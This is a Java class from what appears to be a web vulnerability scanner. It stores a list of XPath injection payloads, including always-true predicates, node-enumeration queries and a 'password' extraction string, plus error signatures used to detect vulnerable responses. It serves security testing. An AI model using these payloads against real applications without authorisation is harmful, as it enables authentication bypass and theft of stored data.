/*
 * Click nbfs://nbhost/SystemFileSystem/Templates/Licenses/license-default.txt to change this license
 * Click nbfs://nbhost/SystemFileSystem/Templates/Classes/Class.java to edit this template
 */
package PayloadSignature.A3Injection;

/**
 *
 * @author shacojx
 */
public class XMLXPathInjection {

    private static String[] arrPayXMLXPathin;
    private static String[] arrSigXMLXPathin;

    public XMLXPathInjection() {
        arrPayXMLXPathin = new String[]{
            "'",
            "' or '1'='1",
            "' or ''='",
            "x' or 1=1 or 'x'='y",
            "/",
            "//",
            "//*",
            "*/*",
            "@*",
            "count(/child::node())",
            "x' or name()='username' or 'x'='y",
            "' and count(/*)=1 and '1'='1",
            "' and count(/@*)=1 and '1'='1",
            "' and count(/comment())=1 and '1'='1",
            "1][1",
            "last()-1 and 1=2",
            "Bible\" and lower-case('A') = \"a",
            "')]password | a[contains(a,'",
            "') or contains(genre, '",
            "') or not(contains(genre, 'praveen') and '1'='2"};

        arrSigXMLXPathin = new String[]{
            "SimpleXMLElement::xpath()",
            "Invalid predicate in",
            "xmlXPathEval: evaluation failed in"};
    }

    public String[] getArrPayXMLXPathin() {
        return arrPayXMLXPathin;
    }

    public String[] getArrSigXMLXPathin() {
        return arrSigXMLXPathin;
    }
}
